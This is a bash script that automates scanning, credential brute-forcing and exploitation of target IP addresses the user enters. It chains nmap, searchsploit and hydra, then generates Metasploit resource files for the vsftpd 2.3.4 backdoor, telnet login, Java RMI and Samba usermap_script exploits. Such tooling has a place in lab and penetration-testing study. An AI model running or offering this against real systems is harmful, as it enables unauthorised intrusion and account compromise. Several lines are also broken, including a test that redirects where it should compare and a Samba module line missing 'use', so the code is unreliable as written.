#!/bin/bash

function scan()
{
	echo "Starting to scan $i ..."
	nmap "$IP" -p- -sV -oX ./$IP/"$IP"nmap.xml  -oN ./$IP/"$IP"nmap.txt
}

function NSE()
{
	echo "Starting to check NSE version ..." 
	nmap "$IP" -p- -sV --script=version -oN ./$IP/"$IP"nmapversion.txt
}

function searchsploit1()
{
	echo "Starting Searchsploit ..."
	searchsploit -x --nmap ./$IP/"$IP"nmap.xml > ./$IP/"$IP"searchsploit.txt
}

function bruteforce()
{
	echo "Starting Brute Force ..."
	check=$(cat ./$IP/"$IP"nmap.txt | grep open | grep ssh | wc -l)
	if [ $check > 0 ]
	then
		hydra -L user.txt -P password.txt $IP ssh -vV > ./$IP/"$IP"hydrassh.txt
	fi
	
	check=$(cat ./$IP/"$IP"nmap.txt | grep open | grep telnet | wc -l)
	if [ $check > 0 ]
	then
		hydra -L user.txt -P password.txt $IP telnet -vV > ./$IP/"$IP"hydrassh.txt
	fi
	
	nmap "$IP" -p- -sV --script=brute -oN ./$IP/"$IP"nmapbrute.txt
}

function repeat()
{
	read -p "Do you still want to exploit on other IP Address? A) Yes B) Exit " ans
	case $ans in
	A) 
	
		exploit
		
	;;	
	
	B) 

		exit
	
	;;
	esac
}

function exploit()
{	
	read -p "Please refer to nmap.txt, which protocol would you like to exploit? A) VSftpd 2.3.4 backdoor B) Telnet Login Access  C) Java RMI Server Default Configuration D) Samba versions 3.0.20 through 3.0.25rc3 E) Exit  : " checker
	case $checker in
	
	A) 
		read -p "Please provide IP Address that you want to exploit : " IP
		echo 'use exploit/unix/ftp/vsftpd_234_backdoor' > ./$IP/vsftpd234_scriptest.rc
		echo "set rhosts $IP" >> ./$IP/vsftpd234_scriptest.rc
		echo "run" >> ./$IP/vsftpd234_scriptest.rc
		msfconsole -r ./$IP/vsftpd234_scriptest.rc 
		repeat
	;;
	
		
	B)	
		read -p "Please provide IP Address that you want to exploit : " IP
		echo 'use auxiliary/scanner/telnet/telnet_login' > ./$IP/telnet_scriptest.rc
		echo "set rhosts $IP" >> ./$IP/telnet_scriptest.rc
		echo "set pass_file password.txt" >> ./$IP/telnet_scriptest.rc
		echo "set user_file user.txt" >> ./$IP/telnet_scriptest.rc
		echo "run" >> ./$IP/telnet_scriptest.rc
		msfconsole -r ./$IP/telnet_scriptest.rc 
		repeat
		
	;; 
	
	C)
		read -p "Please provide IP Address that you want to exploit : " IP
		rport=$(cat ./$IP/"$IP"nmapbrute.txt | grep open | grep -w "java-rmi" | awk -F / '{print $1}')
		echo 'use exploit/multi/misc/java_rmi_server' > ./$IP/javarmi_scriptest.rc
		echo "set rhosts $IP" >> ./$IP/javarmi_scriptest.rc
		echo "set rport $rport" >> ./$IP/javarmi_scriptest.rc
		echo "run" >> ./$IP/javarmi_scriptest.rc
		msfconsole -r ./$IP/javarmi_scriptest.rc 
		repeat
		
	;;
	
	D)
		read -p "Please provide IP Address that you want to exploit : " IP
		rport=$(cat ./$IP/"$IP"nmapbrute.txt | grep open | grep -w "Samba smbd" | awk -F / '{print $1}')
		echo 'exploit/multi/samba/usermap_script' > ./$IP/samba_scriptest.rc
		echo "set rhosts $IP" >> ./$IP/samba_scriptest.rc
		echo "set rport $rport" >> ./$IP/samba_scriptest.rc
		echo "run" >> ./$IP/samba_scriptest.rc
		msfconsole -r ./$IP/samba_scriptest.rc 
		repeat
		
	;;
	
	E)	
		
		exit
	;;
	esac
}

read -p "How many IP Address/target would you like to scan? " n


for (( i=1 ; i<=$n ; i++));
do
read -p "Please provide No. $i IP Address: " IP

mkdir $IP
scan
NSE
searchsploit1
bruteforce

done
exploit


